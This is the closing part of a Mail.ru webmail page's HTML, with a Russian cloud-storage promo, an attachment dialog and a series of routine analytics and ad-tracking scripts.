								<div class="popup_attach-to-compose__cloud-promo__row">
									<div class="popup_attach-to-compose__cloud-promo__cell">
										<div class="popup_attach-to-compose__cloud-promo__description">
											<b>Объем вашего облака — 25Гб.</b> Используйте его для хранения любых файлов, например: фото, видео, музыки, документов.
										</div>
									</div>
								</div>
								<div class="popup_attach-to-compose__cloud-promo__row popup_attach-to-compose__cloud-promo__row_minimal-height">
									<div class="popup_attach-to-compose__cloud-promo__controls">
										
											<button class="btn btn_stylish btn_main js-cloud-promo__next" type="submit"><span class="btn__text">Продолжить</span></button>
										
									</div>
								</div>
							</div>
						</div>

					</div>
					<div class="mr_clear"></div>
				</div>
			</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Прикрепить</span></button>
				<button class="btn btn_stylish confirm-cancel" type="button"><span class="btn__text">Отменить</span></button>
			
		</div>
	</form>
</div>

	</div>
</div>


			<div style="position: absolute; top: -10000px; left: -10000px">
				<div id="_counters_"></div>
				
				<div id="_trash_"></div>
			</div>

			

			

	<div id="mailru-drop-zone" style="display: none; border: 3px dashed #b1cee5; background-color: rgba(234,242,248,.8); z-index: 3000; position: fixed; left: 5px; right: 5px; top: 5px; bottom: 5px;">
		<div style="color: #069; position: absolute; width: 500px; top: 220px; left: 50%; margin-left: -250px; text-shadow: 0 1px 0 #fff; font-size: 30px; text-align: center; height: 50px;">Перетащите файлы сюда, чтобы прикрепить к письму</div>
	</div>

	<div style="position:absolute;left:-10000px;">
	

	<img src="https://rs.mail.ru/d227223.gif?sz=&amp;rnd=183016994&amp;ts=1443445249&amp;sz=" style="width:0;height:0;position:absolute;visibility:hidden;" alt="">

<!--LiveInternet counter.--><script type="text/javascript"><!--
new Image().src = "//counter.yadro.ru/hit;win-mail?r"+
escape(document.referrer)+((typeof(screen)=="undefined")?"":
";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
screen.colorDepth:screen.pixelDepth))+";u"+escape(location.getHref ? location.getHref() : document.URL)+
";"+Math.random();//--></script><!--/LiveInternet-->

<script type="text/javascript">
try{
var _tmr = _tmr || [];
_tmr.push({id: "110605",  type: "pageView", url: (('getHref'in location)?location.getHref():location.href), title: "", start: (new Date()).getTime()});
_tmr.push({id: "2035946",  type: "pageView", url: (('getHref'in location)?location.getHref():location.href), title: "", start: (new Date()).getTime()});
(function (d, w, script_name) {
 if (w[script_name]) { w[script_name].parentNode.removeChild(w[script_name]); }
 var ts = w[script_name] = d.createElement("script"); ts.type = "text/javascript"; ts.async = true;
 ts.src = "https://top-fwz1.mail.ru/js/code.js";
 var f = function () {var s = d.getElementsByTagName("script")[0]; s.parentNode.insertBefore(ts, s);};
 if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); }
})(document, window, "__top_code_script");
} catch (e) {}
</script><noscript><div style="position:absolute;left:-10000px;">
<img src="//top-fwz1.mail.ru/counter?id=110605;js=na" style="border:0;" height="1" width="1" alt="Рейтинг@Mail.ru" />
<img src="//top-fwz1.mail.ru/counter?id=2035946;js=na" style="border:0;" height="1" width="1" alt="Рейтинг@Mail.ru" />
</div></noscript>



<script type="text/javascript">
(function (n, w, d) {
  var m="application/x-shockwave-flash",p,f="0",o,v;
  if (n.mimeTypes && n.mimeTypes[m]) {
    if (p = n.mimeTypes[m].enabledPlugin) {
      f = p.description.match(/\d+\.\d+/)[0];
    }
  } else if (typeof w.ActiveXObject != "undefined") {
    try {
      if (o = new ActiveXObject("ShockwaveFlash.ShockwaveFlash")) {
        v = o.GetVariable("$version").split(" ")[1].split(",");
        f = v[0]+"."+v[1];
      }
    } catch (e) {}
  }
  (new Image).src = ("https:"==d.location.protocol?"https:":"http:")+"//r3.mail.ru/k?fver="+f+"&mh=81e4121baf7286eca0b199916eff4bfd";
})(navigator, window, document);
</script>






<script>
	try {
		if (window.patron && patron && patron.radar && window.jQuery && jQuery.browser) {
			(function _tryAgain() {
				try {
					var body = document.getElementsByTagName('body'), count = body.length;
					if (count > 1) {
						patron.radar('fail_body', jQuery.browser.label + '=' + count, count);
						if ($(body[0]).has('.themeId')[0] && !$(body[1]).has('.themeId')[0]) {
							$(body[1]).remove().children().appendTo(body[0]);
							patron.radar('fail_body_fix', jQuery.browser.label + '=1', 1);
						}
					}
				} catch (err) {}
			})();
		}
	} catch (e) {}
	try {
	  var wa_length = document.getElementsByClassName('nwa-dialog').length;
	  if (wa_length){
	    new Image().src = new Image().src = '//mail.radar.imgsmail.ru/update?p=mail&t=wa_length&v=' + wa_length + '&rnd=' + Math.random();
	    new Image().src = new Image().src = '//mail.radar.imgsmail.ru/update?p=mail&t=wa_length_' + wa_length + '&v=' + wa_length + '&rnd=' + Math.random();
	  } else {
	    new Image().src = new Image().src = '//mail.radar.imgsmail.ru/update?p=mail&t=wa_length_zero&v=1&rnd=' + Math.random();
	  }
	} catch (e) {}
</script>

<script>
try {
(function(w,d,s) {
    s = w.encodeURIComponent || escape;
    new Image().src = "http" + ((d.URL.charAt(4) == "s") ? "s://sb" : "://b") + ".scorecardresearch.com/b?c1=2&c2=9999305&ns__t=" + +(new Date) + "&ns_c=" + (d.characterSet || d.defaultCharset || "") + "&c7=" + s(d.URL) + "&c9=" + s(d.referrer);
})(window,document);
} catch(e) {}
</script>

<script>
try {
	if (!window._avast_counter && window.avastBHO && window.patron && patron.radar) {
		window._avast_counter = 1;
		patron.radar('has_avast', 1);
		new Image().src = '//ad.mail.ru/i615.gif' + '?rnd=' + Math.random();
	}
} catch (e) {}
</script>

<script>
try {
	if (!window._1link_counter) {
		window._1link_counter = 1;
		new Image().src = '//1link.mail.ru/direct.gif?r=' + encodeURIComponent(document.referrer) + '&rnd=' + Math.random();
	}
} catch (e) {}
</script>


<script>
try{
    (function(session, visible_start, visible_end){
        if (window.patron && !patron.__sesion_length_binded && patron.radar && window.jQuery && store && store.enabled && __PH){
            patron.__sesion_length_binded = true;
            visible_start = +(new Date);
            session = store.get('last_session') ? JSON.parse(store.get('last_session')) : {end: null, length:0, visible:0};
            if (session.end && new Date - session.end > 1 * 60 * 1000){
                session.length = Math.ceil(session.length / 1000);
                session.visible = Math.ceil(session.visible / 1000);
                patron.radar('Session', [ 'Duration=' + session.length
                                        , 'length_' + $.browser.label + '=' + session.length
                                        , 'visible_' + $.browser.label + '=' + session.visible].join('&'));
                session = {end: null, length:0, visible:0};
                store.remove('last_session');
            }
            __PH.on('visibilitychange', function(evt){
                if (evt.data.visible){
                    visible_start = +(new Date);
                } else {
                    session.visible = (session.visible || 0) + (new Date - visible_start);
                }
            })
            jQuery(window).bind('beforeunload', function (evt){
                try{
                    if (!evt.originalEvent){
                        return;
                    }
                    session.end = +(new Date);
                    session.length = session.length + (new Date - document.TS);
                    session.visible = (session.visible || 0) + (new Date - visible_start);
                    store.set('last_session', JSON.stringify(session));
                } catch (e) {}
            });
        }
    })();
} catch (e) {}
</script>







<script>
  try{
    if (patron.radar && patron.v2){
      patron.radar('email_version_septima', 1);
      patron.radar('septima_' + patron.build, 1);
    } else if (patron.radar) {
      patron.radar('email_version_old', 1);
    } else {
      new Image().src = '//mail.radar.imgsmail.ru/update?email=&p=mail&t=email_version_light&v=1&rnd=' + Math.random();
    }
  }catch(e){}
</script>






<script>
try {
	(function (w) {

		if (w.jQuery && w.ajs && ajs.scrollTop && w.patron && patron.radar && Array.forEach && ( Math.random() * 1000 < 50 )) {

			var $window = $(w);
			var banners = [{id: 'slot-container_2', key: 'lb'}, {id: 'rb-direct-left-slot', key: 'ld'}];

			$window.one('refresh.ad', function () {

				setTimeout(function () {

					try {

						var radar_parts = [];
						var visibleCount = 0;

						var windowScrollTop = ajs.scrollTop();
						var windowHeight = $window.height();
						var directs = $('#rb-direct-left-slot').find(".yap-item").length;
						
  					if (directs === 3 && $("#slot-container_2").height() > 5){
  
  						Array.forEach(banners, function (item) {
  	
  							var $container = $('#' + item.id);
  							
  	
  							if ($container.children().length) {
  	
  								var containerHeight = $container.height();
  								var containerOffsetTop = $container.offset().top;
  								var height = 0;
  	
  								if (containerOffsetTop > windowScrollTop + windowHeight) {
  									radar_parts.push(item.key + '_after_viewport=1');
  								} else if (containerOffsetTop + containerHeight < windowScrollTop) {
  									radar_parts.push(item.key + '_before_viewport=1');
  								} else {
  	
  									visibleCount++;
  	
  									height = (containerOffsetTop + containerHeight) - windowScrollTop;
  									if (containerOffsetTop > windowScrollTop) {
  										height = (windowScrollTop + windowHeight) - containerOffsetTop;
  									}
  									height = Math.min(Math.min(containerHeight, Math.max(height, 0)), windowHeight);
  								}
  	
  								var percent = height * 100 / containerHeight, percentKey = '';
  	
  								if (percent === 100) {
  									percentKey = '100';
  								} else if (percent === 0) {
  									percentKey = '0';
  								} else if (percent < 20) {
  									percentKey = '1_19';
  								} else if (percent < 50) {
  									percentKey = '20_49';
  								} else {
  									percentKey = '50_100';
  								}
  	
  								radar_parts.push(item.key + '_pixel=' + height, item.key + '_percent_' + percentKey + '=1', item.key + '_height=' + containerHeight);
  	
  							} else {
  								radar_parts.push(item.key + '_no_banner=1');
  							}
  						});
  
  						if (!visibleCount) {
  							radar_parts.push('no_view_banners=1');
  						}
  
  						if (radar_parts.length) {
  							patron.radar('left_banners', radar_parts.join('&'));
  						}
  					}

					} catch (e) {}

				}, 1000);
			});
		}
	})(window);
} catch (e) {}

try {
  //if( store.get('beta.tester') ){ store.remove('beta.tester') };
} catch (e) {}

</script>














<script>
try {
  if (Math.random() < .01){
  	$(document).bind("ajaxSend", function(event, jqXHR, ajaxOptions) {
  		 try {
  		 	jqXHR.complete( function (xhr){
  		 		try {
  		 		  var time = xhr.getResponseHeader("X-ETime") * 1000;
  		 		  var status = xhr.status;
  		 		  var res = JSON.parse(xhr.responseText);
  		 		  var error = (res && res[0] == "AjaxResponse" && res[2].Error != null) ? "_error" : "";
  		 		  //if (error) {
  		 		  // new Image().src = '//mail.radar.imgsmail.ru/update?email=' + patron.useremail + '&p=mail&t=AjaxResponse_error&v=1&rlog=AjaxResponse_error&rlog_message=' + res[2].Error + '&rnd=' + Math.random();
  		 		  //}
  					if (ajaxOptions.url.indexOf("func_name=cbHardDeleteFile") !== -1) {
  						patron.radar("api_v0", "remove_attach" + error + "_" + status + "=" + time);
  					} else if (ajaxOptions.url.indexOf("attach_upload2") !== -1) {
  						patron.radar("api_v0", "add_attach" + error + "_" + status + "=" + time);
  					} else if (ajaxOptions.url.indexOf("func_name=message_to_draft") !== -1) {
  						patron.radar("api_v0", "draft" + error + "_" + status + "=" + time);
  					} else if (ajaxOptions.url.indexOf("func_name=send") !== -1) {
  						patron.radar("api_v0", "send" + error + "_" + status + "=" + time);
  					}
  		 		} catch (e) {}
  		 	});
  		} catch (e) {}
  	});
  }
} catch (e) {}
</script>















<script>
try {
	if (window.patron && !patron.IsCorpUser) {
		delete patron.PerformanceMeasurePrint;
	}
} catch (e) {}
</script>

  <script>
    try{
        var loop = function(){
            setTimeout(function(){
                try{
	                if(patron.__duplicatedSetInterval){
	                    new Image().src = '//mail.radar.imgsmail.ru/update?email=' + patron.useremail + '&p=mail&t=message_status_duplicated&v=1&rlog=message_status_duplicated&rlog_message=' + location.toString() + '&rnd=' + Math.random();
	                }
	                loop();
                } catch (e) {}
            }, 5000);
        };

        loop();
    } catch (e) {}
  </script>












	<!-- system:518289 -->


	

	

<script type="text/javascript">
//<![CDATA[
(function(w, d) {
        if (w.rb_counter) return;
        function h() {
                var n, a = arguments;
                for(var i=a.length;i--;){
                        n = a[i].split(',');
                        for(var j=n.length;j--;){
                                c(n[j]);
                        }
                }
        }
        function c(n) {
                var m, r = parseInt(Math.random()*1E9), s;
                if (!(m = n.match(/^(?:cl([bn])|([adgin]))(\d+)(?:sz(\d+))?/))) return;
                if (m[1]) {
                        s = "s" + m[1];
                }
                else if(m[2] == "n") {
                        s = "nc";
                }
                else if(m[2]=="i") {
                        r = null;
                        s = m[2];
                }
                else {
                        s = m[2];
                }
                s += m[3] + ".gif?";
                if (m[4]) s += "sz=" + m[4];
                if (r) s += "&rnd=" + r;
                (new Image).src = "//rs.mail.ru/" + s;
        }
        (function(o, e, fn) {
                if (o.addEventListener) o.addEventListener(e, fn, false);
                else if (o.attachEvent) o.attachEvent('on' + e, fn);
                else o['on' + e] = fn;
        })(d, 'mousedown', function(e) {
                var n;
                e = e || w.event;
                e = e.target || e.srcElement;
                while (e.parentNode){
                        if ((n = e.getAttribute('name')) && (n = n.toString())){
                                h(n);
                        }
                        e = e.parentNode;
                }
        });
        w.rb_counter = h;
})(window, document);
//]]>
</script>





</div>


	
	
	



</body></html>